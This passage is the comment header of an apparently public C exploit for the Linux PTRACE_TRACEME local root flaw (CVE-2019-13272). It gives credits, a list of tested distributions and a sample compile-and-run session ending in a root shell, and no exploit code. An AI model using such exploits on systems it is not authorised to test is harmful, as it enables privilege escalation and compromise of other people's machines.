// Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
// Uses pkexec technique
// ---
// Original discovery and exploit author: Jann Horn
// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
// ---
// <bcoles@gmail.com>
// - added known helper paths
// - added search for suitable helpers
// - added automatic targeting
// - changed target suid exectuable from passwd to pkexec
// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272
// ---
// Tested on:
// - Ubuntu 16.04.5 kernel 4.15.0-29-generic
// - Ubuntu 18.04.1 kernel 4.15.0-20-generic
// - Ubuntu 19.04 kernel 5.0.0-15-generic
// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic
// - Linux Mint 19 kernel 4.15.0-20-generic
// - Debian 9.4.0 kernel 4.9.0-6-amd64
// - Debian 10.0.0 kernel 4.19.0-5-amd64
// - Devuan 2.0.0 kernel 4.9.0-6-amd64
// - SparkyLinux 5.8 kernel 4.19.0-5-amd64
// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64
// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO
// - Mageia 6 kernel 4.9.35-desktop-1.mga6
// - Antergos 18.7 kernel 4.17.6-1-ARCH
// ---
// user@linux-mint-19-2:~$ gcc -s poc.c -o ptrace_traceme_root
// user@linux-mint-19-2:~$ ./ptrace_traceme_root
// Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
// [.] Checking environment ...
// [~] Done, looks good
// [.] Searching for known helpers ...
// [~] Found known helper: /usr/sbin/mate-power-backlight-helper
// [.] Using helper: /usr/sbin/mate-power-backlight-helper
// [.] Spawning suid process (/usr/bin/pkexec) ...
// [.] Tracing midpid ...
// [~] Attached to midpid
// To run a command as administrator (user "root"), use "sudo <command>".
// See "man sudo_root" for details.
//
// root@linux-mint-19-2:/home/user#
// ---